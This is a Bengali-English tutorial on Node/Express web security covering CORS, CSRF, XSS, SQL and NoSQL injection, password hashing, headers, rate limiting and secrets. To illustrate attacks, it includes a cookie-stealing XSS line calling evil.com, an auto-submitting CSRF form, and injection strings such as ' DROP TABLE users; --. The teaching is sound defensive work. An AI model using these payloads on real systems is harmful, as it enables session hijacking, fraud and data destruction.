# Security Best Practices (নিরাপত্তা সেরা অনুশীলন)

## Web Security কেন গুরুত্বপূর্ণ?

প্রতিটি backend application internet-এ exposed — attacker সবসময় vulnerability খুঁজছে। একটা security hole মানে user data চুরি, financial loss, এবং trust হারানো।

```
Common Attack Vectors:
  XSS      → User-এর browser-এ malicious script চালানো
  CSRF     → User-কে দিয়ে unwanted action করানো
  SQLi     → Database manipulate করা
  CORS     → Cross-origin data চুরি
  Brute Force → Password guess করা

Rule #1: Never trust user input
Rule #2: Defense in depth (একাধিক layer-এ protection)
Rule #3: Least privilege (minimum access দাও)
```

---

## CORS (Cross-Origin Resource Sharing)

### Same-Origin Policy কী?

Browser-এর built-in security — এক origin-এর page অন্য origin-এ request পাঠাতে পারে না:

```
Origin = Protocol + Domain + Port
  https://example.com:443

Same Origin:
  https://example.com/page1 → https://example.com/api  ✅

Different Origin (Cross-Origin):
  https://frontend.com → https://api.backend.com        ❌ Blocked!
  http://localhost:3000 → http://localhost:5000           ❌ Blocked! (port different)
  https://example.com → http://example.com                ❌ Blocked! (protocol different)
```

### CORS কেন দরকার?

```
Frontend: https://myapp.com (React)
Backend:  https://api.myapp.com (Express)

React → fetch('https://api.myapp.com/users')
Browser → "এটা cross-origin request! CORS header নেই → BLOCK!"

CORS header দিলে:
  Access-Control-Allow-Origin: https://myapp.com
  Browser → "Backend allow করেছে → request যেতে দাও ✅"
```

### CORS কীভাবে কাজ করে

```
Simple Request (GET, POST with simple headers):
  Browser → Request + Origin header → Server
  Server → Response + Access-Control-Allow-Origin → Browser
  Browser → Origin match? → ✅ Allow / ❌ Block

Preflight Request (PUT, DELETE, custom headers):
  Browser → OPTIONS request (preflight) → Server
  Server → "হ্যাঁ, এই origin, method, headers allow" → Browser
  Browser → Actual request পাঠাও → Server
  Server → Response → Browser

Preflight কখন হয়:
  - Method: PUT, PATCH, DELETE
  - Custom headers: Authorization, X-Custom-Header
  - Content-Type: application/json (simple না)
```

### Implementation

```bash
npm install cors
```

```javascript
const cors = require('cors');

// ❌ সব origin allow — production-এ করো না!
app.use(cors());

// ✅ Specific origins allow
app.use(cors({
    origin: ['https://myapp.com', 'https://admin.myapp.com'],
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: true,        // Cookie পাঠানো allow
    maxAge: 86400              // Preflight cache: 24 hours
}));

// ✅ Dynamic origin (multiple environments)
app.use(cors({
    origin: (origin, callback) => {
        const allowedOrigins = [
            'https://myapp.com',
            'https://staging.myapp.com',
            process.env.NODE_ENV === 'development' && 'http://localhost:3000'
        ].filter(Boolean);

        if (!origin || allowedOrigins.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true
}));
```

### Manual CORS (Without Library)

```javascript
app.use((req, res, next) => {
    const allowedOrigins = ['https://myapp.com'];
    const origin = req.headers.origin;

    if (allowedOrigins.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
    }

    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Max-Age', '86400');

    if (req.method === 'OPTIONS') {
        return res.sendStatus(204);
    }

    next();
});
```

---

## CSRF (Cross-Site Request Forgery)

### CSRF কী?

Attacker user-কে **তার নিজের অজান্তে** authenticated action করায়:

```
1. User bank.com-এ logged in (session cookie আছে)
2. User evil.com visit করে
3. evil.com-এ hidden form আছে:
   <form action="https://bank.com/transfer" method="POST">
     <input type="hidden" name="to" value="attacker_account">
     <input type="hidden" name="amount" value="100000">
   </form>
   <script>document.forms[0].submit();</script>
4. Browser automatically bank.com-এর cookie পাঠায়!
5. Bank server মনে করে user নিজেই request করেছে → Money transfer! 😱
```

```
CSRF কাজ করে কারণ:
  Cookie automatically প্রতিটি request-এ পাঠায়
  Server জানে না request কোন page থেকে এসেছে (legitimate or malicious)
```

### CSRF Prevention

#### ১. SameSite Cookie

```javascript
res.cookie('sessionId', value, {
    sameSite: 'lax',    // Cross-site POST-এ cookie পাঠাবে না
    httpOnly: true,
    secure: true
});

// sameSite values:
// strict → Cross-site কোনো request-এ cookie যাবে না
// lax    → Cross-site navigation (GET) → cookie যাবে, POST → যাবে না
// none   → সবখানে যাবে (secure: true দরকার)
```

#### ২. CSRF Token

```bash
npm install csurf
```

```javascript
const csrf = require('csurf');

app.use(csrf({ cookie: true }));

// Form render-এ token দাও
app.get('/form', (req, res) => {
    res.render('form', { csrfToken: req.csrfToken() });
});

// Template:
// <form method="POST" action="/transfer">
//   <input type="hidden" name="_csrf" value="<%= csrfToken %>">
//   ...
// </form>

// SPA-তে (React/Vue):
app.get('/api/csrf-token', (req, res) => {
    res.json({ csrfToken: req.csrfToken() });
});

// Client-side:
// fetch('/api/transfer', {
//   method: 'POST',
//   headers: { 'X-CSRF-Token': csrfToken },
//   body: ...
// });
```

#### ৩. Double Submit Cookie

```javascript
const crypto = require('crypto');

// Login-এ CSRF token set
app.post('/api/auth/login', (req, res) => {
    const csrfToken = crypto.randomBytes(32).toString('hex');

    res.cookie('csrf_token', csrfToken, {
        httpOnly: false,   // JS-এ read করা লাগবে
        secure: true,
        sameSite: 'strict'
    });

    // ... session/JWT logic
});

// Middleware — cookie ও header-এর token match check
function csrfProtection(req, res, next) {
    if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
        return next();
    }

    const cookieToken = req.cookies.csrf_token;
    const headerToken = req.headers['x-csrf-token'];

    if (!cookieToken || !headerToken || cookieToken !== headerToken) {
        return res.status(403).json({ error: 'CSRF token mismatch' });
    }

    next();
}
```

```
CSRF Prevention Strategy:
  Session-based auth → SameSite cookie + CSRF token
  JWT in header     → CSRF risk নেই (cookie auto-send হয় না)
  JWT in cookie     → SameSite + CSRF token দরকার
```

---

## XSS (Cross-Site Scripting)

### XSS কী?

Attacker **malicious JavaScript** inject করে যা অন্য user-এর browser-এ execute হয়:

```
1. Attacker comment লেখে:
   <script>fetch('https://evil.com/steal?c='+document.cookie)</script>

2. Server save করে database-এ (sanitize না করে)

3. অন্য user page visit করে → Browser script execute করে
   → Cookie/token চুরি → Session hijack!
```

### XSS Types

```
Stored XSS:
  Attacker input → Database → অন্য user-এর page → Execute
  উদাহরণ: Comment, profile bio, forum post

Reflected XSS:
  Attacker URL → Server → Response-এ inject → Execute
  উদাহরণ: Search: /search?q=<script>alert('xss')</script>

DOM-based XSS:
  Client-side JavaScript-এ inject (server-এ যায় না)
  উদাহরণ: document.innerHTML = location.hash
```

### XSS Prevention

#### ১. Output Encoding (HTML Escape)

```javascript
function escapeHtml(str) {
    const map = {
        '&': '&amp;', '<': '&lt;', '>': '&gt;',
        '"': '&quot;', "'": '&#039;'
    };
    return str.replace(/[&<>"']/g, c => map[c]);
}

// Template-এ escape করো
const safeName = escapeHtml(user.name);
```

#### ২. Content Security Policy (CSP)

```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],              // Inline script block!
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "https://cdn.example.com"],
        connectSrc: ["'self'", "https://api.example.com"],
        frameAncestors: ["'none'"],
        objectSrc: ["'none'"]
    }
}));

// CSP header:
// Content-Security-Policy: default-src 'self'; script-src 'self'; ...
// → Inline <script> execute হবে না!
// → External script শুধু 'self' domain থেকে load হবে!
```

#### ৩. Input Sanitization

```javascript
const sanitizeHtml = require('sanitize-html');

const clean = sanitizeHtml(userInput, {
    allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br', 'a'],
    allowedAttributes: { 'a': ['href'] },
    allowedSchemes: ['http', 'https']
});
```

#### ৪. httpOnly Cookie

```javascript
res.cookie('token', value, {
    httpOnly: true   // document.cookie দিয়ে access করা যাবে না
});
```

#### ৫. Framework Auto-Escaping

```
React   → JSX auto-escapes {{ }}
Vue     → {{ }} auto-escapes
Angular → {{ }} auto-escapes
Django  → {{ }} auto-escapes

⚠️ Dangerous:
React  → dangerouslySetInnerHTML
Vue    → v-html
Django → {{ var|safe }}
```

```
XSS Prevention Checklist:
  ✅ Output encode (HTML escape)
  ✅ CSP header (script-src 'self')
  ✅ Input sanitize (sanitize-html)
  ✅ httpOnly cookie
  ✅ Framework auto-escape ব্যবহার করো
  ❌ innerHTML / dangerouslySetInnerHTML avoid
  ❌ eval() NEVER use
```

---

## SQL Injection

### SQL Injection কী?

User input-কে **SQL query-র অংশ হিসেবে execute** করানো:

```javascript
// ❌ Vulnerable — String concatenation
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;

// Attacker input:
// email: admin@test.com
// password: ' OR 1=1 --

// Generated query:
// SELECT * FROM users WHERE email = 'admin@test.com' AND password = '' OR 1=1 --'
//                                                                    ^^^^^^^^
//                                               1=1 সবসময় true → সব user return!
```

```
আরো dangerous attacks:
  ' DROP TABLE users; --      → পুরো table delete!
  ' UNION SELECT * FROM ...   → অন্য table-এর data দেখা
  '; INSERT INTO admins ...   → নতুন admin তৈরি
```

### SQL Injection Prevention

#### ১. Parameterized Queries (Prepared Statements)

```javascript
// ❌ NEVER — String concatenation
const query = `SELECT * FROM users WHERE email = '${email}'`;

// ✅ Parameterized Query — PostgreSQL (pg)
const result = await db.query(
    'SELECT * FROM users WHERE email = $1 AND password = $2',
    [email, password]
);

// ✅ Parameterized Query — MySQL
const result = await db.execute(
    'SELECT * FROM users WHERE email = ? AND password = ?',
    [email, password]
);
```

```
Parameterized query-তে:
  User input → data হিসেবে treat হয়, SQL code হিসেবে না
  email = "' OR 1=1 --" → literally "' OR 1=1 --" string search করবে
  SQL injection impossible!
```

#### ২. ORM ব্যবহার করো

```javascript
// Mongoose (MongoDB)
const user = await User.findOne({ email: req.body.email });

// Prisma
const user = await prisma.user.findUnique({ where: { email } });

// Sequelize
const user = await User.findOne({ where: { email } });

// সব ORM internally parameterized query ব্যবহার করে
```

#### ৩. NoSQL Injection Prevention

```javascript
// ❌ Vulnerable
const user = await User.findOne({
    email: req.body.email,
    password: req.body.password
});
// Attack: { "password": { "$gt": "" } }
// → সব password match!

// ✅ Type check
if (typeof req.body.email !== 'string' || typeof req.body.password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
}

// ✅ Validation library ব্যবহার করো (Joi/Zod)
// → Schema-তে string enforce করো
```

#### ৪. Least Privilege Database User

```sql
-- Application database user-কে minimum permissions দাও
CREATE USER app_user WITH PASSWORD 'secure_password';
GRANT SELECT, INSERT, UPDATE ON users TO app_user;
-- DELETE, DROP, ALTER দিও না!

-- Admin tasks-এর জন্য আলাদা user
CREATE USER admin_user WITH PASSWORD 'admin_secure';
GRANT ALL PRIVILEGES ON ALL TABLES TO admin_user;
```

---

## Password Hashing

### কেন Hash করতে হয়?

```
Plain text password store করলে:
  Database breach → সব password দেখা যায়!
  83% user same password একাধিক site-এ ব্যবহার করে
  → এক site breach → অন্য সব site-ও compromised!
```

### bcrypt

```javascript
const bcrypt = require('bcrypt');

// Hash করো (registration-এ)
const saltRounds = 12;
const hash = await bcrypt.hash('mypassword123', saltRounds);
// $2b$12$LJ3m4H...random_salt...hashed_output

// Verify করো (login-এ)
const isMatch = await bcrypt.compare('mypassword123', hash);
// true or false
```

```
bcrypt কীভাবে কাজ করে:
  1. Random salt generate করে (প্রতিবার different)
  2. Password + salt → hash
  3. Salt hash-এর মধ্যেই store হয়

saltRounds (cost factor):
  10 → ~10 hashes/sec    (fast, less secure)
  12 → ~2-3 hashes/sec   (recommended ✅)
  14 → ~0.5 hashes/sec   (slow, very secure)

Higher = slower = brute force কঠিন
কিন্তু login-ও slow হয়, তাই balance দরকার
```

### Argon2 (নতুন, আরো secure)

```bash
npm install argon2
```

```javascript
const argon2 = require('argon2');

// Hash
const hash = await argon2.hash('mypassword123', {
    type: argon2.argon2id,    // Recommended variant
    memoryCost: 2 ** 16,      // 64MB memory
    timeCost: 3,               // 3 iterations
    parallelism: 1
});

// Verify
const isMatch = await argon2.verify(hash, 'mypassword123');
```

```
bcrypt vs Argon2:
──────────────────────────────────
bcrypt:
  ✅ Battle-tested (1999 থেকে)
  ✅ Widely supported
  ❌ CPU-hard only

Argon2 (2015, Password Hashing Competition winner):
  ✅ Memory-hard (GPU brute force কঠিন)
  ✅ Configurable memory, time, parallelism
  ✅ Modern, recommended by OWASP
  ❌ Newer, কিছু platform-এ support কম

Recommendation: নতুন project → Argon2id, existing → bcrypt ঠিক আছে
```

### Salt and Pepper

```
Salt:
  প্রতিটি password-এ unique random value
  Hash-এর সাথেই store হয়
  bcrypt/argon2 automatically handle করে
  Purpose: Same password → different hash

  user1: "password123" + salt_abc → $2b$12$abc...hash1
  user2: "password123" + salt_xyz → $2b$12$xyz...hash2
  → Same password কিন্তু different hash!
  → Rainbow table attack বন্ধ

Pepper:
  সব password-এ same secret value add
  Database-তে store করো না → environment variable-এ
  Purpose: Database breach হলেও pepper ছাড়া crack করা যায় না

  hash = bcrypt(password + pepper, saltRounds)
```

```javascript
// Pepper implementation
const PEPPER = process.env.PASSWORD_PEPPER;  // env variable-এ রাখো

// Registration
const hash = await bcrypt.hash(password + PEPPER, 12);

// Login
const isMatch = await bcrypt.compare(password + PEPPER, user.password);

// Pepper সুবিধা:
// Database dump হলেও pepper ছাড়া password crack করা যাবে না
// Pepper app server-এ আছে, database server-এ নেই
```

---

## Security Headers

### helmet.js

```bash
npm install helmet
```

```javascript
const helmet = require('helmet');
app.use(helmet());
```

```
helmet() যা set করে:
──────────────────────────────────────────────────────────────────
X-Content-Type-Options: nosniff
  → MIME type sniffing বন্ধ (JS হিসেবে image execute করা ঠেকায়)

X-Frame-Options: DENY
  → iframe-এ embed করা বন্ধ (clickjacking prevention)

Strict-Transport-Security: max-age=31536000; includeSubDomains
  → Browser-কে বলে "শুধু HTTPS ব্যবহার করো"

X-XSS-Protection: 0
  → Browser-এর deprecated XSS filter বন্ধ (CSP ব্যবহার করো)

Referrer-Policy: no-referrer
  → অন্য site-এ যাওয়ার সময় referrer URL পাঠাবে না

Content-Security-Policy
  → কোন source থেকে script/style/image load করা যাবে
```

### Additional Security Headers

```javascript
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https://cdn.example.com"],
            connectSrc: ["'self'", "https://api.example.com"],
            fontSrc: ["'self'", "https://fonts.googleapis.com"],
            objectSrc: ["'none'"],
            upgradeInsecureRequests: []
        }
    },
    crossOriginEmbedderPolicy: true,
    crossOriginOpenerPolicy: true,
    crossOriginResourcePolicy: { policy: "same-site" }
}));

// Server identity লুকাও
app.disable('x-powered-by');
```

---

## Rate Limiting

Brute force ও DDoS থেকে protection:

```bash
npm install express-rate-limit
```

```javascript
const rateLimit = require('express-rate-limit');

// Global rate limit
const globalLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 minutes
    max: 100,                    // 100 requests per window
    message: { error: 'Too many requests, please try again later' },
    standardHeaders: true,       // RateLimit-* headers
    legacyHeaders: false
});
app.use(globalLimiter);

// Login-এ strict rate limit (brute force prevention)
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 5,                       // 15 মিনিটে মাত্র 5 login attempt
    message: { error: 'Too many login attempts. Try again in 15 minutes.' },
    skipSuccessfulRequests: true  // সফল login count হবে না
});
app.post('/api/auth/login', loginLimiter, loginHandler);

// API key-based rate limit
const apiLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 60,
    keyGenerator: (req) => req.headers['x-api-key'] || req.ip
});
app.use('/api/v1', apiLimiter);
```

---

## Secrets Management

### ❌ Anti-Patterns

```javascript
// ❌ Code-এ secret hardcode করা
const JWT_SECRET = 'my-super-secret-key-123';
const DB_PASSWORD = 'admin123';

// ❌ Git-এ .env push করা
// .env file-এ secret আছে কিন্তু .gitignore-এ নেই!
```

### ✅ Environment Variables

```bash
# .env file (git-এ push করো না!)
JWT_SECRET=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
DATABASE_URL=postgresql://user:pass@db.internal:5432/myapp
REDIS_URL=redis://localhost:6379
GOOGLE_CLIENT_SECRET=GOCSPX-abc123
PASSWORD_PEPPER=x9y8z7w6v5u4t3s2r1q0
```

```javascript
// .env load করো
require('dotenv').config();

const jwtSecret = process.env.JWT_SECRET;
const dbUrl = process.env.DATABASE_URL;
```

```bash
# .gitignore-এ MUST add:
.env
.env.local
.env.production
```

### Secrets Validation (Startup-এ check)

```javascript
const requiredEnvVars = [
    'JWT_SECRET',
    'DATABASE_URL',
    'REDIS_URL',
    'SESSION_SECRET'
];

for (const envVar of requiredEnvVars) {
    if (!process.env[envVar]) {
        console.error(`Missing required environment variable: ${envVar}`);
        process.exit(1);
    }
}

// JWT_SECRET minimum length check
if (process.env.JWT_SECRET.length < 32) {
    console.error('JWT_SECRET must be at least 32 characters');
    process.exit(1);
}
```

### Production Secrets Management

```
Tool                Provider        Features
──────────────────────────────────────────────
AWS Secrets Manager AWS             Rotation, versioning
Google Secret Mgr   GCP             Auto-rotation
Azure Key Vault     Azure           HSM-backed
HashiCorp Vault     Self-hosted     Open source, powerful
Doppler             Third-party     Team sync, environments
```

```
Secret Generation:
  openssl rand -hex 32          → 64-char hex string
  openssl rand -base64 32       → 44-char base64 string
  node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

---

## Production Security Checklist

```
Authentication:
  ✅ bcrypt/argon2 দিয়ে password hash (saltRounds ≥ 12)
  ✅ JWT short-lived (15 min) + refresh token
  ✅ Rate limit login attempts (5/15 min)
  ✅ Account lockout after failed attempts

Transport:
  ✅ HTTPS everywhere (TLS 1.2+)
  ✅ HSTS header (Strict-Transport-Security)
  ✅ Secure cookie flag

Headers:
  ✅ helmet() ব্যবহার করো
  ✅ Content-Security-Policy
  ✅ X-Content-Type-Options: nosniff
  ✅ X-Frame-Options: DENY
  ✅ Remove X-Powered-By

CORS:
  ✅ Specific origins allow (wildcard * না)
  ✅ Credentials সহ হলে origin explicit

CSRF:
  ✅ SameSite cookie (lax/strict)
  ✅ CSRF token (session-based auth-এ)

XSS:
  ✅ Output encoding (HTML escape)
  ✅ CSP header
  ✅ Input sanitization (sanitize-html)
  ✅ httpOnly cookie
  ✅ Framework auto-escape

Injection:
  ✅ Parameterized queries (NEVER string concat)
  ✅ ORM ব্যবহার করো
  ✅ Input type validation
  ✅ Least privilege database user

Secrets:
  ✅ Environment variables (NEVER hardcode)
  ✅ .env → .gitignore
  ✅ Strong, random secrets (32+ chars)
  ✅ Secrets rotation
  ✅ Secret management tool (production)

Dependencies:
  ✅ npm audit regularly
  ✅ Dependabot/Snyk enable
  ✅ Lock file commit করো (package-lock.json)

Logging:
  ✅ Login failures log করো
  ✅ Sensitive data log করো না
  ✅ Error details client-কে দিও না
```

---

## সংক্ষেপে মনে রাখার সূত্র

```
CORS:
  Same-Origin Policy → Browser block করে cross-origin request
  CORS headers → Server allow করে নির্দিষ্ট origins
  ✅ Specific origins, ❌ wildcard *

CSRF:
  Cookie auto-send → attacker exploit করে
  Prevention → SameSite cookie + CSRF token
  JWT in header → CSRF risk নেই

XSS:
  Malicious script inject → অন্য user-এর browser-এ execute
  Prevention → Output encode + CSP + sanitize + httpOnly cookie

SQL Injection:
  User input → SQL query-র অংশ হয়ে execute
  Prevention → Parameterized queries + ORM + input validation

Password:
  bcrypt (saltRounds=12) বা argon2id
  Salt → per-password unique (auto by bcrypt)
  Pepper → global secret, env variable-এ

Secrets:
  .env file, NEVER hardcode, .gitignore-এ add
  Production → AWS Secrets Manager / Vault

Security Headers:
  helmet() → এক লাইনে সব important headers

Rate Limiting:
  Global → 100 req/15 min
  Login → 5 attempts/15 min
```

---

## Interview Golden Lines

> **CORS is a browser security feature — the server tells the browser which origins are allowed via Access-Control-Allow-Origin headers.**

> **CSRF exploits the browser's automatic cookie sending — prevention requires SameSite cookies and anti-CSRF tokens for session-based auth.**

> **XSS injects malicious scripts into other users' browsers — prevent with output encoding, Content-Security-Policy, input sanitization, and httpOnly cookies.**

> **SQL injection turns user input into executable SQL — always use parameterized queries or ORMs, never string concatenation.**

> **bcrypt and argon2 are deliberately slow hashing algorithms — this makes brute force attacks computationally expensive. MD5 and SHA are too fast for passwords.**

> **Pepper adds a server-side secret to passwords before hashing — even if the database is compromised, passwords can't be cracked without the pepper.**

> **Defense in depth means applying security at every layer — input validation, output encoding, parameterized queries, security headers, and rate limiting together.**
